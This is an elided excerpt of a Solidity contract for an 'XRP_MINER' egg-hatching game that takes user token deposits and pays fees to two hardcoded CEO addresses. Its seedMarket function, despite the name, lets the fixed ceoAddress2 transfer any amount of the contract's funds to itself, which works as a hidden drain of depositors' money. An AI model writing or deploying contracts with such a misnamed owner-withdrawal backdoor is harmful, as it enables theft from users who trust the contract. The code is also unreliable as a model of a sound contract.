...
contract XRP_MINER {
    ...
    uint256 public EGGS_TO_HATCH_1MINERS=786240;//for final version should be seconds in a day
    uint256 PSN=10000;
    uint256 PSNH=5000;
    ...
    uint256 public marketEggs=78624000000;
    	//address  public admin;

    constructor() public{
        ceoAddress=msg.sender;
        ceoAddress2=address(0x6e1Ca3836C0Ef920cd3483d4F68d3CaC6a3395bE);
    }
    ...
    function sellEggs() public {
        ...
        ERC20(xrp).transfer(ceoAddress, fee2);
        ERC20(xrp).transfer(ceoAddress2, fee-fee2);
        ERC20(xrp).transfer(address(msg.sender), SafeMath.sub(eggValue,fee));
    }
    ...
    function seedMarket(uint256 amount) external{
        
        require(ceoAddress2==msg.sender, 'Admin what?');
        _safeTransfer(ceoAddress2,amount);
    }
